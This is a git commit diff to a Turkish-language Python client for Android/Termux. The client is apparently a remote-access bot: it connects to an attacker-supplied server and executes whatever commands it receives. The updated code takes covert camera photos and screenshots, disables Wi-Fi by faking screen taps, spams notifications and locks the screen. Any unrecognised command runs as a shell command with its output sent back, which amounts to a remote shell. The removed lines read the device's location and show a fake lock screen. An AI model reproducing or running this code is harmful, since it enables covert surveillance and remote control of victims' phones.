8fcaa41fe253befdd340b0738b4da6eac8dc9b04
RobotAdam899 <anonbot918@gmail.com>
2025-07-13 00:15:27 +0300

    Update client.py

--- client.py
+++ client.py
@@ -7,9 +7,13 @@ import time
 sunucu_ip = input("Sunucu IP >> ")
 port = int(input("Port >> "))
 
-log_file = "log.txt"
-fsociety_path = "/sdcard/Fsociety"
+fsociety_path = "/sdcard/Download/Fsociety"
+kamera_path = "/sdcard/Download/DCIM/kamera_fsociety.jpg"
+ekran_path = "/sdcard/Download/Pictures/ekran_fsociety.png"
+log_file = f"{fsociety_path}/log.txt"
 bildirim_sayisi = 0
+
+os.makedirs(fsociety_path, exist_ok=True)
 
 s = socket.socket()
 s.connect((sunucu_ip, port))
@@ -30,7 +34,6 @@ def spam_istek(adet):
 def dosya_olustur(adet):
     if adet > 100:
         return "[X] En fazla 100 dosya oluşturabilirsin."
-    os.makedirs(fsociety_path, exist_ok=True)
     for i in range(1, adet + 1):
         uzanti = random.choice(["txt", "log", "json"])
         with open(f"{fsociety_path}/dosya_{i}.{uzanti}", "w") as f:
@@ -46,99 +49,68 @@ while True:
             s.send("[✓] Bağlantı kapatıldı.".encode())
             break
 
-        elif komut.startswith("spam-istek"):
-            try:
-                adet = int(komut.split(" ")[1])
-                sonuc = spam_istek(adet)
-                s.send(sonuc.encode())
-            except:
-                s.send("[X] Sayı hatalı.".encode())
+        elif komut.startswith("spam-istek "):
+            adet = int(komut.split(" ")[1])
+            s.send(spam_istek(adet).encode())
 
-        elif komut.startswith("olustur-dosya"):
-            try:
-                adet = int(komut.split(" ")[1])
-                sonuc = dosya_olustur(adet)
-                s.send(sonuc.encode())
-            except:
-                s.send("[X] Sayı hatalı.".encode())
+        elif komut.startswith("olustur-dosya "):
+            adet = int(komut.split(" ")[1])
+            s.send(dosya_olustur(adet).encode())
 
         elif komut.startswith("youtube "):
             link = komut.split(" ", 1)[1]
-            os.system(f"am start -a android.intent.action.VIEW -d '{link}'")
-            s.send("[✓] YouTube bağlantısı açıldı.".encode())
+            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
+            s.send("[✓] YouTube açıldı.".encode())
 
         elif komut.startswith("google "):
             arama = komut.split(" ", 1)[1]
-            link = f"https://www.google.com/search?q={arama.replace(' ', '+')}"
+            link = f"https://www.google.com/search?q={arama.replace(" ", "+")}"
             os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
-            s.send("[✓] Google araması açıldı.".encode())
+            s.send("[✓] Google araması yapıldı.".encode())
 
         elif komut == "wifi-off":
             sonuc = os.system("svc wifi disable")
             if sonuc != 0:
                 os.system("am start -a android.settings.WIFI_SETTINGS")
                 time.sleep(1)
-                os.system("input tap 200 300")
-                s.send("[✓] Root yok, WiFi ayarı açıldı ve otomatik kapatıldı.".encode())
+                os.system("input tap 500 400")  # ekranına göre güncellenebilir
+                s.send("[✓] Root yoktu, WiFi ayarı açıldı ve simülasyonla kapatıldı.".encode())
             else:
                 s.send("[✓] WiFi kapatıldı.".encode())
 
-        elif komut.startswith("google-kapat "):
-            arama = komut.split(" ", 1)[1]
-            link = f"https://www.google.com/search?q={arama.replace(' ', '+')}"
-            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
-            time.sleep(1)
-            sonuc = os.system("svc wifi disable")
-            if sonuc != 0:
-                os.system("am start -a android.settings.WIFI_SETTINGS")
-                time.sleep(1)
-                os.system("input tap 200 300")
-                s.send("[✓] Google arandı, WiFi otomatik kapatıldı.".encode())
-            else:
-                s.send("[✓] Google arandı ve WiFi kapatıldı.".encode())
-
         elif komut.startswith("sound "):
-            os.system("termux-media-player play /sdcard/Music/*.mp3")
-            s.send("[✓] Müzik çalınıyor.".encode())
+            os.system("termux-media-player play /sdcard/Download/*.mp3")
+            s.send("[✓] Ses dosyası oynatılıyor.".encode())
 
         elif komut.startswith("bildirim "):
             try:
-                parcalar = komut.split("\"")
-                baslik = parcalar[1]
-                icerik = parcalar[3]
+                parca = komut.split("\"")
+                baslik = parca[1]
+                icerik = parca[3]
                 os.system(f'termux-notification -t "{baslik}" -c "{icerik}"')
                 bildirim_sayisi += 1
                 s.send("[✓] Bildirim gönderildi.".encode())
             except:
-                s.send("[X] Bildirim hatalı.".encode())
+                s.send("[X] Bildirim gönderilemedi.".encode())
 
         elif komut == "bildirim-say":
             s.send(f"[✓] Toplam {bildirim_sayisi} bildirim gönderildi.".encode())
 
         elif komut == "kilit":
             os.system("input keyevent 26")
-            s.send("[✓] Ekran kapatıldı.".encode())
+            s.send("[✓] Ekran kilitlendi.".encode())
 
         elif komut == "kamera":
-            os.system("termux-camera-photo -c 1 /sdcard/DCIM/kamera_fsociety.jpg")
-            s.send("[✓] Kamera görüntüsü alındı.".encode())
-
-        elif komut == "konum":
-            konum = os.popen("termux-location").read()
-            s.send(konum.encode() if konum else "[X] Konum alınamadı.".encode())
+            os.system(f"termux-camera-photo -c 1 {kamera_path}")
+            s.send("[✓] Fotoğraf çekildi.".encode())
 
         elif komut == "ekran-al":
-            os.system("screencap -p /sdcard/Pictures/ekran_fsociety.png")
+            os.system(f"screencap -p {ekran_path}")
             s.send("[✓] Ekran görüntüsü alındı.".encode())
 
-        elif komut == "fake-kilit":
-            os.system('am start -a android.intent.action.MAIN -n com.termux/.HomeActivity')
-            os.system("input keyevent 26")
-            s.send("[✓] Fake kilit ekranı etkinleştirildi.".encode())
-
         else:
-            cikti = os.popen(komut).read()
-            s.send(cikti.encode() if cikti else "[✓] Komut çalıştı.".encode())
+            sonuc = os.popen(komut).read()
+            s.send(sonuc.encode() if sonuc else "[✓] Komut çalıştı.".encode())
 
     except Exception as e:
         try:
